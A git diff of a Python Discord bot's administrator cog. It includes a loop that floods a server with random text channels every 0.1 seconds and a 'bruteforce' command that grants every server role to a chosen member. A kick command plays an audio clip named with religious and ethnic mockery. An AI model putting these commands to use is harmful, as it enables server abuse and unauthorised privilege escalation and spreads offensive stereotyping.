@@ -2,9 +2,16 @@
 from discord.ext import tasks, commands
 import utilities as util
 import discord
+import asyncio
+import random
 
 # Order of admins is: larrabyte, captainboggle, computerfido, huxley2039 and elsoom.
 admins = [268916844440715275, 306249172032552980, 233399828955136021, 324850150889750528, 306896325067145228]
+
+def isadmin(self, ctx):
+    if ctx.author.id in admins: return True
+    elif ctx.guild.id == util.guilds[2]: return True
+    else: return False
 
 @tasks.loop(seconds=1.0)
 async def nickloop(ctx, name):
@@ -22,11 +29,6 @@ async def mexloop(ctx):
 @tasks.loop(seconds=0.1)
 async def channelingloop(ctx):
     await ctx.guild.create_text_channel(util.randstr(100))
-
-def isadmin(self, ctx):
-    if ctx.author.id in admins: return True
-    elif ctx.guild.id == util.guilds[2]: return True
-    else: return False
 
 class administrator(commands.Cog):
     def __init__(self, bot):
@@ -59,7 +61,7 @@ class administrator(commands.Cog):
         await channelingloop.start(ctx)
 
     @commands.command()
-    async def channelthechannel(self, ctx):
+    async def nomorechannels(self, ctx):
         """Inner channels? No more!"""
         channelingloop.stop()
 
@@ -89,20 +91,19 @@ class administrator(commands.Cog):
            !اتصل بالشرطة!  اتصل بالشرطة"""
         voiceclass = self.bot.get_cog("voice")
         if user: ctx.author = user
-
-        try: await voiceclass.join(ctx)
-        except Exception: pass
-
+        await voiceclass.join(ctx)
         await voiceclass.play(ctx, "./ffmpeg/music/allahuakbar.mp3")
+        await asyncio.sleep(2)
+
         await ctx.guild.voice_client.disconnect()
         await ctx.guild.kick(ctx.author)
     
     @commands.command()
-    async def bruteforce(self, ctx):
+    async def bruteforce(self, ctx, user: discord.Member=None):
         """Brute-force the roles until something works :)"""
-        me = discord.utils.get(ctx.guild.members, name="anthony baker")
+        if not user: user = discord.utils.get(ctx.guild.members, name="anthony baker")
         for roles in ctx.guild.roles:
-            try: await me.add_roles(roles)
+            try: await user.add_roles(roles)
             except Exception: pass
 
     @commands.command()
